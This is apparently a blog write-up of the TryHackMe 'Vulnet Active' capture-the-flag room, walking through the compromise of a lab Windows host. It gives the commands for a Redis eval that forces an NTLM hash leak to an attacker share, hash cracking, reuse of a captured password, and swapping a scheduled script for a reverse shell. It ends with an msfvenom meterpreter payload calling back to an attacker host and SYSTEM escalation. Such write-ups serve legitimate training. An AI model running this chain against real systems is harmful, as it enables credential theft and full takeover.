---
title: "Vulnet Active"
date: 2025-08-13
draft: false
summary: "Writeup for Vulnet Active CTF challenge on TryHackMe."
tags: ["windows", "ntlm relay", "hash crack", "misconfigured privs"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/vulnet-active/cover.webp"
  caption: "Vulnet Active TryHackMe Challenge"
  alt: "Vulnet Active cover"
platform: "TryHackMe"
---

VulnNet Entertainment just moved their entire infrastructure... Check this out...
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/vulnnetactive

## Reconnaissance

I performed an **nmap** aggressive scan on the target to find open ports and the services running on them.

```shell
nmap -A -Pn -p- TARGET --min-rate 10000 -oN vulnet.nmap 
```

![](https://cdn.ziomsec.com/vulnet-active/1.webp)

## Initial Foothold

I found **redis** to be running so I searched online for ways I could interact with the service and found this article: 
- https://hackviser.com/tactics/pentesting/services/redis

I tried accessing the server using the `passwordless` login feature and succeeded.

```shell
redis-cli -h TARGET
```

![](https://cdn.ziomsec.com/vulnet-active/2.webp)

I looked for ways I could exploit this and found this article. It seems I could relay my ntlm credentials through smb.
- https://exploit-notes.hdks.org/exploit/database/redis/#ntlm-hash-disclosure

I started responder on my interface

```shell
responder -I tun0
```

![](https://cdn.ziomsec.com/vulnet-active/3.webp)

I then tried accessing a share on my system and found the NLTM hash on responder.

```shell
eval "dofile('//ATTACKER/share')" 0
```

![](https://cdn.ziomsec.com/vulnet-active/4.webp)

![](https://cdn.ziomsec.com/vulnet-active/5.webp)

I saved the hash and cracked it using **john**.

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt ntlmHash
```

![](https://cdn.ziomsec.com/vulnet-active/6.webp)

I then listed the shares using the newly discovered credentials.

```shell
smbclient -L TARGET -U "enterprise-security"
```

![](https://cdn.ziomsec.com/vulnet-active/7.webp)

I connected to the server using my credentials and accessed `Enterprise-Share`

```shell
impacket-smbclient 'enterprise-security':'sand_0873959498'@target
> use Enterprise-Share
```

![](https://cdn.ziomsec.com/vulnet-active/8.webp)

I then downloaded the ps1 script and it seemed like it deleted the contents of the Documents directory. I replaced the contents with a reverse shell and uploaded it back into the system.

![](https://cdn.ziomsec.com/vulnet-active/9.webp)

```shell
put PurgeIrrelevantData_1826.ps1
```

![](https://cdn.ziomsec.com/vulnet-active/10.webp)

I soon got a reverse shell.

```shell
rlwrap nc -lnvp 4444
```

![](https://cdn.ziomsec.com/vulnet-active/11.webp)

I navigated to Desktop and found the user flag.

```shell
more C:\Users\enterprise-security\Desktop\user.txt
```

![](https://cdn.ziomsec.com/vulnet-active/12.webp)

## Privilege Escalation

### Enumerating Vectors

I then uploaded **`PowerUp.ps1`** for local enumeration.
- https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp

![](https://cdn.ziomsec.com/vulnet-active/13.webp)

I created a temp directory and shifted the script to it.

![](https://cdn.ziomsec.com/vulnet-active/14.webp)

Finally, I executed the script and found that I had the **SeImpersonatePrivilege**.

```shell
Import-Module ./PowerUp.ps1
Invoke-AllChecks
```

![](https://cdn.ziomsec.com/vulnet-active/15.webp)

### Exploiting `SeImpersonatePrivilege`

This could be used to launch a potato attack and gain administrative access. So I tried exploiting it using **EfsPotato**.
- https://github.com/zcgonvh/EfsPotato

I tried executing the payload but it kept failing. So I created an msfvenom payload to get a meterpreter shell.

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=PORT -f exe -o meter.exe
```

![](https://cdn.ziomsec.com/vulnet-active/16.webp)

### Privesc Using Metasploit

I uploaded the payload through smb and executed it to get a reverse meterpreter shell on metasploit.

```shell
./meter.exe
```

![](https://cdn.ziomsec.com/vulnet-active/17.webp)

```shell
getsystem
```

After getting a shell, I used **`getsystem`** command to automatically escalate privilege and gain NT AUTHORITY\SYSTEM access. Finally, I captured the root flag from Administrator's desktop.

![](https://cdn.ziomsec.com/vulnet-active/18.webp)

That's it from my side!
Happy hacking :)

---
